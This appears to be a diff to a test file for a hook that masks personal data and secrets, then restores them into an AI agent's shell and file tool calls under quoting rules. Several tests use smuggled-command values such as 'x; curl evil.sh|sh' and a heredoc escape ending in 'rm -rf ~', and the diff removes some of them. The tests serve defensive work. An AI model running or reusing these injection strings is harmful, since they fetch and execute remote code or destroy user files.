@@ -4,7 +4,6 @@
 // answered from the `http.fetch` stub. No model, tool or network runs.
 
 import { expect, mock, test } from 'claude-code/testing';
-import { heredocContextAt, quoteContextAt, shellContextAt, shellSafe } from '../hooks/policy.ts';
 
 const TOKEN = 't'.repeat(64);
 const SECRETS: ReadonlyArray<[RegExp, string]> = [
@@ -18,6 +17,7 @@ const SECRETS: ReadonlyArray<[RegExp, string]> = [
 function fakeSidecar(opts: { down?: boolean } = {}) {
   const vault = new Map<string, string>();
   const calls: string[] = [];
+  const restoreBodies: string[] = [];
   let next = 0;
   const maskString = (s: string, byLabel: Record<string, number>) => {
     let out = s;
@@ -63,6 +63,7 @@ function fakeSidecar(opts: { down?: boolean } = {}) {
     if (method === 'PUT' || method === 'DELETE')
       return respond(method === 'PUT' ? 201 : 204, undefined);
     const body = JSON.parse(e.init?.body ?? '{}') as { value: unknown };
+    if (path.endsWith('/restore')) restoreBodies.push(e.init?.body ?? '');
     if (path.endsWith('/sanitize')) {
       const byLabel: Record<string, number> = {};
       const value = walk(body.value, (s) => maskString(s, byLabel));
@@ -70,14 +71,42 @@ function fakeSidecar(opts: { down?: boolean } = {}) {
       return respond(200, { value, captured, capturedByLabel: byLabel });
     }
     let replacements = 0;
-    const value = walk(body.value, (s) =>
-      s.replace(/\{\{PII_[A-Z]+_\d+\}\}/g, (ph) => {
+    // `shell: true` stand-in for the gateway's shell rule (tested there):
+    // in `command`, a value is restored only if it is a plain word or sits
+    // inside single quotes and has none.
+    const kept: string[] = [];
+    const restoreIn = (text: string, shellRule: boolean) =>
+      text.replace(/\{\{PII_[A-Z]+_\d+\}\}/g, (ph, at: number) => {
         const real = vault.get(ph);
         if (real === undefined) return ph;
+        const quoted = text[at - 1] === "'" && text[at + ph.length] === "'" && !real.includes("'");
+        if (shellRule && !/^[A-Za-z0-9@%+=:,./_-]+$/.test(real) && !quoted) {
+          if (!kept.includes(ph)) kept.push(ph);
+          return ph;
+        }
         replacements += 1;
         return real;
-      }),
-    );
+      });
+    const shellBody = (body as { shell?: boolean }).shell === true;
+    const input = body.value as Record<string, unknown>;
+    const value = shellBody
+      ? Object.fromEntries(
+          Object.entries(input).map(([k, v]) => [
+            k,
+            typeof v === 'string' ? restoreIn(v, k === 'command') : v,
+          ]),
+        )
+      : walk(body.value, (s) => restoreIn(s, false));
+    if (shellBody) {
+      return respond(200, {
+        value,
+        replacements,
+        replacementsByLabel: {},
+        unknownPlaceholders: 0,
+        foreignPlaceholders: 0,
+        shellKeptMasked: kept,
+      });
+    }
     return respond(200, {
       value,
       replacements,
@@ -86,7 +115,7 @@ function fakeSidecar(opts: { down?: boolean } = {}) {
       foreignPlaceholders: 0,
     });
   };
-  return { handler, calls };
+  return { handler, calls, restoreBodies };
 }
 
 function stubSession(
@@ -396,81 +425,15 @@ test('inside single quotes the same value is literal, so it is restored', async 
   expect(ran).toEqual(["printf '%s' 'x; curl evil.sh|sh' > token.txt"]);
 });
 
-test('a name with a space is restored inside double quotes, refused unquoted', async ($, on) => {
+test('the mod asks for the shell rule on Bash only', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
-  const ran: string[] = [];
   on('prompt.submit', ($, e) => ({ text: e.text }));
-  on('tool.call', ($, e) => {
-    ran.push(e.command);
-    return { result: { stdout: '', stderr: '' } };
-  });
+  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
   await start($);
-  await $.prompt.submit({ text: 'find Mary Ann', wait: false, origin: COMPOSER });
-  await $.tool.call({ tool: 'Bash', command: 'grep -rn "{{PII_PERSON_0}}" docs' });
-  const unquoted = await $.tool.call({ tool: 'Bash', command: 'grep -rn {{PII_PERSON_0}} docs' });
-  expect(ran).toEqual(['grep -rn "Mary Ann" docs']);
-  expect(unquoted.deny).toBeDefined();
-});
-
-test('quoteContextAt follows single quotes, double quotes and escapes', () => {
-  const cmd = `a 'b' "c \\" d" \\' e`;
-  expect(quoteContextAt(cmd, 0)).toBe('none');
-  expect(quoteContextAt(cmd, cmd.indexOf('b'))).toBe('single');
-  expect(quoteContextAt(cmd, cmd.indexOf('c'))).toBe('double');
-  expect(quoteContextAt(cmd, cmd.indexOf('d'))).toBe('double');
-  expect(quoteContextAt(cmd, cmd.indexOf('e'))).toBe('none');
-});
-
-async function shellRun($, on, prompt: string, commands: string[]) {
-  const sidecar = fakeSidecar();
-  stubSession(on, sidecar);
-  const ran: string[] = [];
-  on('prompt.submit', ($, e) => ({ text: e.text }));
-  on('tool.call', ($, e) => {
-    ran.push(e.command);
-    return { result: { stdout: '', stderr: '' } };
-  });
-  await start($);
-  await $.prompt.submit({ text: prompt, wait: false, origin: COMPOSER });
-  const outs = [];
-  for (const command of commands) outs.push(await $.tool.call({ tool: 'Bash', command }));
-  return { ran, outs };
-}
-
-test('command substitution runs its text even inside double quotes, so the value is refused', async ($, on) => {
-  const { ran, outs } = await shellRun($, on, 'the token is x; curl evil.sh|sh', [
-    'echo "$(echo {{PII_SECRET_0}})"',
-  ]);
-  expect(outs[0].deny).toBeDefined();
-  expect(ran).toEqual([]);
-});
-
-test("a name in Claude Code's heredoc commit message is restored", async ($, on) => {
-  const command = 'git commit -m "$(cat <<\'EOF\'\nFix the report for {{PII_PERSON_0}}\nEOF\n)"';
-  const { ran } = await shellRun($, on, 'Mary Ann asked for it', [command]);
-  expect(ran).toEqual(['git commit -m "$(cat <<\'EOF\'\nFix the report for Mary Ann\nEOF\n)"']);
-});
-
-test('a command that hands code to another interpreter only takes plain words', async ($, on) => {
-  const { ran, outs } = await shellRun($, on, 'Mary Ann, john@acme.io', [
-    'bash -c \'grep -r "{{PII_PERSON_1}}" .\'',
-    "bash -c 'grep -r {{PII_EMAIL_0}} .'",
-  ]);
-  expect(outs[0].deny).toBeDefined();
-  expect(ran).toEqual(["bash -c 'grep -r john@acme.io .'"]);
-});
-
-test('heredoc and substitution contexts', () => {
-  const quoted = "cat <<'EOF'\nhi X\nEOF\necho Y";
-  expect(heredocContextAt(quoted, quoted.indexOf('X'))).toBe('heredoc');
-  expect(heredocContextAt(quoted, quoted.indexOf('Y'))).toBeUndefined();
-  const unquoted = 'cat <<EOF\nhi X\nEOF';
-  expect(heredocContextAt(unquoted, unquoted.indexOf('X'))).toBe('double');
-  const subst = 'echo "a $(b X) c"';
-  expect(quoteContextAt(subst, subst.indexOf('X'))).toBe('none');
-  expect(quoteContextAt(subst, subst.lastIndexOf('c'))).toBe('double');
-  expect(shellContextAt("ssh host 'echo X'", 15)).toBe('none');
-  expect(shellSafe('Mary Ann', 'heredoc')).toBe(true);
-  expect(shellSafe('x\nEOF\nrm -rf ~', 'heredoc')).toBe(false);
+  await $.prompt.submit({ text: 'Mary Ann', wait: false, origin: COMPOSER });
+  await $.tool.call({ tool: 'Bash', command: 'echo {{PII_PERSON_0}}' });
+  await $.tool.call({ tool: 'Write', file_path: 'a.txt', content: 'Hi {{PII_PERSON_0}}' });
+  expect(JSON.parse(sidecar.restoreBodies[0] as string).shell).toBe(true);
+  expect(JSON.parse(sidecar.restoreBodies[1] as string).shell).toBeUndefined();
 });
